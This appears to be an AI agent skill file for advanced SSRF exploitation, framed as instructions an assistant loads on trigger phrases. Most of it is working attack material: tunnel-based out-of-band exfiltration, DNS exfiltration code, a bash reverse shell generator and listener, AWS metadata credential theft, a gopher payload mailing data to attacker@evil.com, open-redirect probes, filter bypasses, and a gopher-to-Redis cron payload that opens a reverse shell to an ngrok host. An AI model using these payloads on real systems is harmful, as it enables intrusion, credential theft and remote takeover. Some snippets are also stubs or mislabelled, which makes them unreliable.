---
name: ssrf-advanced
description: SSRF Advanced - OOB data exfiltration and tunnel exploitation. Use when asked to "exploit SSRF", "blind SSRF", "OOB callback", "SSRF tunnel", "exfiltrate via SSRF", "gopher SSRF", or set up an out-of-band callback server (cloudflare/ngrok) for SSRF.
---

# SSRF Advanced - OOB Data Exfiltration & Tunnel Exploitation

## Overview

Advanced SSRF exploitation using Cloudflare Tunnel and ngrok for:
- Out-of-Band (OOB) data exfiltration
- Blind SSRF validation
- Reverse shell delivery via SSRF
- Internal network pivoting with callback channels

## Prerequisites

```bash
# Cloudflare Tunnel (cloudflared)
# https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/

# Ngrok
# https://ngrok.com/download

# Optional: interactsh for blind SSRF detection
# go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

## Quick Start

### 1. Setup Tunnel

```bash
# Option A: Cloudflare Tunnel (recommended - free, persistent URL)
cloudflared tunnel --url http://localhost:8080

# Option B: Ngrok (free tier - random subdomain)
ngrok http 8080

# Option C: Custom domain with cloudflared
cloudflared tunnel create ssrf-oob
cloudflared tunnel route dns ssrf-oob ssrf-oob.yourdomain.com
cloudflared tunnel run ssrf-oob
```

### 2. Start Callback Server

```bash
# Built-in callback server with logging
python3 -m http.server 8080 --bind 0.0.0.0

# Or use nc for simple logging
nc -lvnp 8080

# Advanced: Custom callback catcher
python3 workers/ssrf-callback-server.py --port 8080 --log callbacks.log
```

### 3. Exploit SSRF

```bash
# Basic OOB test
curl -H "Host: <tunnel-url>" http://<target>/api/fetch

# With path to extract data
curl -H "Host: <tunnel-url>/exfil" http://<target>/api/fetch?url=http://<tunnel-url>/$(whoami)
```

## Exploitation Patterns

### Pattern 1: Blind SSRF Detection

```python
# workers/ssrf-blind-detector.py
import requests
import time

def test_blind_ssrf(target, callback_url, param="url"):
    """Test for blind SSRF using OOB callback"""

    payloads = [
        f"http://{callback_url}/ssrf-test",
        f"http://{callback_url}/ssrf-test?{param}=1",
        f"//{callback_url}/ssrf-test",
        f"dict://{callback_url}:8080/",
        f"ldap://{callback_url}:389/",
        f"gopher://{callback_url}:8080/_TEST",
    ]

    for payload in payloads:
        print(f"[*] Testing: {payload}")
        try:
            requests.get(f"http://{target}/?{param}={payload}", timeout=5)
        except:
            pass
        time.sleep(2)  # Wait for callback

    print("[*] Check your callback server for incoming requests")
```

### Pattern 2: Data Exfiltration via DNS

```python
# workers/ssrf-dns-exfil.py
import requests
import base64

def exfil_via_dns(data, callback_domain):
    """Exfiltrate data via DNS subdomain (8.8.8.8 bypasses some filters)"""

    # Encode data
    encoded = base64.b64encode(data.encode()).decode().replace('=', '')

    # Split into chunks (63 char limit per subdomain label)
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]

    for i, chunk in enumerate(chunks):
        subdomain = f"{chunk}.{i}.{callback_domain}"
        try:
            requests.get(f"http://8.8.8.8/?d={subdomain}", timeout=1)
        except:
            pass
```

### Pattern 3: Reverse Shell via SSRF

```python
# workers/ssrf-reverse-shell.py
import socket
import threading
import base64

def create_shell_payload(lhost, lport):
    """Create bash reverse shell encoded for URL transport"""
    shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    return base64.b64encode(shell.encode()).decode()

def start_listener(port):
    """Start reverse shell listener"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    print(f"[*] Listening on port {port}...")

    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")

    while True:
        cmd = input("$ ")
        if cmd == 'exit':
            break
        conn.send(cmd.encode() + b'\n')
        print(conn.recv(4096).decode())

    conn.close()
```

### Pattern 4: Cloud Metadata Extraction

```python
# workers/ssrf-cloud-extract.py
import requests
import json

def extract_aws_metadata(callback_url):
    """Extract AWS metadata and send to callback"""

    # IMDSv2 token
    token_payload = "http://169.254.169.254/latest/api/token"

    # Steps:
    # 1. SSRF to get token: PUT /latest/api/token with X-aws-ec2-metadata-token-ttl-seconds: 21600
    # 2. SSRF to get metadata using token
    # 3. Send results to callback URL

    exfil_paths = [
        "/latest/meta-data/iam/security-credentials/",
        "/latest/meta-data/instance-id",
        "/latest/meta-data/public-ipv4",
        "/latest/user-data",
    ]

    return {
        "steps": [
            f"1. SSRF PUT http://169.254.169.254/latest/api/token -> {callback_url}/token",
            f"2. SSRF GET with token to metadata -> {callback_url}/data",
        ],
        "paths": exfil_paths
    }
```

## Advanced Techniques

### Technique 1: gopher:// Protocol

```python
# Craft gopher payloads for protocol smuggling
def gopher_smtp_exfil(smtp_server, callback_data):
    """Use gopher to send SMTP commands via SSRF"""

    payload = (
        "gopher://" + smtp_server + ":25/_" +
        "EHLO%20test%0D%0A" +
        "MAIL%20FROM%3A%3Ctest%40test.com%3E%0D%0A" +
        "RCPT%20TO%3A%3Cattacker%40evil.com%3E%0D%0A" +
        "DATA%0D%0A" +
        "Subject%3A%20SSRF%0D%0A" +
        callback_data +
        "%0D%0A.%0D%0A" +
        "QUIT%0D%0A"
    )
    return payload
```

### Technique 2: 302 Redirect Bypass (CRITICAL)

Use open redirects on the same domain to bypass SSRF filters. Many applications block direct access to internal IPs but follow redirects from their own domain.

```python
def redirect_ssrf_bypass(target_domain, internal_target, callback_url):
    """
    Exploit open redirect to bypass SSRF filters.

    Flow:
    1. SSRF endpoint fetches: http://target.com/redirect?to=http://169.254.169.254/
    2. Server follows 302 redirect to internal IP
    3. Internal response returned or sent to callback
    """

    # Find open redirects on target domain first
    redirect_endpoints = [
        "/redirect?url=",
        "/logout?returnTo=",
        "/login?callback=",
        "/api/redirect?to=",
        "/link?target=",
        "/goto?url=",
    ]

    # Payload: use target's own open redirect to reach internal
    redirect_payload = f"http://{target_domain}/redirect?url=http://{internal_target}"

    return {
        "description": "Use open redirect on same domain to bypass SSRF filter",
        "example": redirect_payload,
        "internal_targets": [
            "169.254.169.254",      # AWS metadata
            "metadata.google.internal",  # GCP metadata
            "192.168.0.1",          # Internal router
            "10.0.0.1",             # Internal gateway
            "localhost:8080",       # Internal service
        ],
        "bypass_logic": "Filter sees whitelisted domain -> Server follows 302 -> Internal access"
    }

def find_open_redirects(base_url):
    """Discover open redirect endpoints that can be used for SSRF bypass"""

    test_payloads = [
        "/?redirect=http://evil.com",
        "/?return_url=http://evil.com",
        "/?goto=http://evil.com",
        "/logout?next=http://evil.com",
        "/login?redirect_uri=http://evil.com",
    ]

    # Returns list of endpoints that 302 redirect to evil.com
    return test_payloads

# Example exploit chain
def exploit_aws_via_redirect(target, callback):
    """
    Real example: Target has /api/redirect?url= that 302s
    Use it to reach AWS metadata
    """
    steps = [
        f"1. Test open redirect: {target}/api/redirect?url={callback}",
        f"2. If 302 to callback works, exploit SSRF:",
        f"   {target}/api/redirect?url=http://169.254.169.254/latest/meta-data/",
        f"3. Response contains AWS credentials or instance info",
    ]
    return steps
```

**Common open redirect patterns to test:**
```
/redirect?url=ATTACKER
/logout?returnTo=ATTACKER
/login?callback=ATTACKER
/link?href=ATTACKER
/goto?target=ATTACKER
/api/v1/redirect?to=ATTACKER
```

**302 Bypass variations:**
1. **Double URL encode**: `%252f` instead of `%2f`
2. **Fragment bypass**: `http://allowed.com#@evil.com`
3. **Path confusion**: `http://allowed.com/evil.com/..%2f..%2finternal`
4. **Protocol switch**: `http://allowed.com -> https://internal`

### Technique 3: FTP Bounce

```python
def ftp_bounce_ssrf(ftp_server, target_ip, target_port):
    """Use FTP PASV mode for SSRF"""

    # Connect to FTP server
    # PORT command with target IP:port
    # LIST/RETR to trigger connection

    return f"ftp://{ftp_server}/?port={target_ip}:{target_port}"
```

### Technique 4: Redis via SSRF

```python
def redis_ssrf_command(redis_host, command):
    """Craft HTTP request that smuggles Redis protocol"""

    # Redis inline protocol over HTTP
    redis_cmd = command.replace(' ', '%20')

    # Some HTTP libraries pass raw data to backend
    payload = (
        "GET / HTTP/1.1\r\n"
        "Host: " + redis_host + "\r\n"
        "\r\n"
        "*2\r\n$4\r\nLLEN\r\n$6\r\nmycmd\r\n"
    )
    return payload
```

## Tool: SSRF Callback Server

```python
#!/usr/bin/env python3
# workers/ssrf-callback-server.py

import http.server
import socketserver
import json
import datetime
import argparse

class SSRFHandler(http.server.SimpleHTTPRequestHandler):
    callbacks = []

    def log_message(self, format, *args):
        timestamp = datetime.datetime.now().isoformat()
        client = self.client_address[0]
        path = self.path
        headers = dict(self.headers)

        entry = {
            "timestamp": timestamp,
            "client": client,
            "path": path,
            "headers": headers,
            "method": self.command
        }
        SSRFHandler.callbacks.append(entry)

        print(f"[{timestamp}] {client} -> {path}")

        # Save to file
        with open("ssrf-callbacks.json", "a") as f:
            f.write(json.dumps(entry) + "\n")

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")

    def do_POST(self):
        content_len = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_len)

        print(f"[+] POST body: {post_body.decode()}")

        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"OK")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', type=int, default=8080)
    args = parser.parse_args()

    with socketserver.TCPServer(("0.0.0.0", args.port), SSRFHandler) as httpd:
        print(f"[*] SSRF Callback Server listening on 0.0.0.0:{args.port}")
        httpd.serve_forever()

if __name__ == "__main__":
    main()
```

## Integration with `hot` CLI

### Command: `hot ssrf oob`

```python
# hot_omelet/commands/ssrf_cmds.py

import click
import subprocess
import threading

@click.command(name='ssrf-oob')
@click.option('--tunnel', type=click.Choice(['cloudflare', 'ngrok']), default='cloudflare')
@click.option('--port', default=8080)
@click.option('--target', help='SSRF target URL')
def ssrf_oob(tunnel, port, target):
    """Setup OOB callback server for SSRF exploitation"""

    # Start callback server
    server_thread = threading.Thread(
        target=start_callback_server,
        args=(port,)
    )
    server_thread.daemon = True
    server_thread.start()

    # Start tunnel
    if tunnel == 'cloudflare':
        subprocess.run(['cloudflared', 'tunnel', '--url', f'http://localhost:{port}'])
    else:
        subprocess.run(['ngrok', 'http', str(port)])
```

## Workflow Examples

### Workflow 1: Blind SSRF to RCE

```bash
# Terminal 1: Setup OOB
hot ssrf oob --tunnel cloudflare --port 9090

# Tunnel URL: https://ssrf-oob-xxxx.trycloudflare.com

# Terminal 2: Exploit
python3 -c "
import requests

TARGET = 'http://victim.com/api/webhook'
OOB = 'https://ssrf-oob-xxxx.trycloudflare.com'

# Step 1: Test connectivity
requests.post(TARGET, json={'url': f'{OOB}/test'})

# Step 2: Exfiltrate /etc/passwd
requests.post(TARGET, json={
    'url': f'file:///etc/passwd',
    'callback': f'{OOB}/exfil'
})

# Step 3: Internal scan
for ip in ['10.0.0.1', '10.0.0.2', '192.168.1.1']:
    requests.post(TARGET, json={
        'url': f'http://{ip}:8080/',
        'callback': f'{OOB}/scan/{ip}'
    })
"
```

### Workflow 2: SSRF Chain to Reverse Shell

```bash
# 1. Setup listener with ngrok
ngrok tcp 4444
# Forwarding: tcp://0.tcp.ngrok.io:12345 -> localhost:4444

# 2. Start local listener
nc -lvnp 4444

# 3. Trigger reverse shell via SSRF
curl -H "Host: internal-api" \
     -X POST \
     http://target.com/api/proxy \
     -d "url=gopher://internal-api:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F0.tcp.ngrok.io%2F12345%200%3E%261%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$4%0d%0a%2Fspool%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a"
```

## Detection & Defense

### Identify Blind SSRF

```python
def detect_blind_ssrf(target, interactsh_url):
    """Use interactsh for blind SSRF detection"""

    payloads = [
        f"http://{interactsh_url}",
        f"https://{interactsh_url}",
        f"//{interactsh_url}",
        f"{interactsh_url}@internal",
    ]

    for payload in payloads:
        test_ssrf_endpoint(target, payload)
```

### Bypass Filters

| Filter | Bypass |
|--------|--------|
| Block 169.254.169.254 | `[::ffff:169.254.169.254]`, `0251.254.169.254` |
| Block localhost | `0.0.0.0`, `127.1`, `127.0.0.1.nip.io` |
| Block http | `file:///`, `ftp://`, `gopher://` |
| Require FQDN | `169.254.169.254.xip.io` |

## References

- [SSRF Bible](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [SSRFMap](https://github.com/swisskyrepo/SSRFmap)
- [ interactsh](https://github.com/projectdiscovery/interactsh)
